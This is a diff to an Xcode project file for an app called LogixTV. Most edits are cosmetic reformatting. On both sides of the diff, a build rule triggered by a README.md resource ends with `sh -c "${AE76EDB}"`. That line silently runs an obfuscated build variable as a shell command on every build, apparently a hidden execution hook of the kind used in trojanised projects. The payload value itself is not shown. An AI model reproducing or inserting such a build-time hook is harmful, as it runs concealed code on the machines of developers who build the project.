@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4AB087FA2EB3A1BCBCBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = 6953EF03D8DC801B97BDE67E; };
+		4AB087FA2EB3A1BCBCBDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 6953EF03D8DC801B97BDE67E /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
@@ -22,13 +22,12 @@
 			outputFiles = (
 				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
 			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${AE76EDB}\"";
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
 		};
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		6953EF03D8DC801B97BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "LogixTV.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
+		6953EF03D8DC801B97BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = LogixTV.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		EEAD6D1D2E40A2F60099A6BA /* LogixTV.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = LogixTV.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -141,21 +140,12 @@ sh -c \"${AE76EDB}\"";
 		};
 /* End PBXProject section */
 
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		EEAD6D1B2E40A2F60099A6BA /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4AB087FA2EB3A1BCBCBDE67E /* README.md */,
+				4AB087FA2EB3A1BCBCBDE67E /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
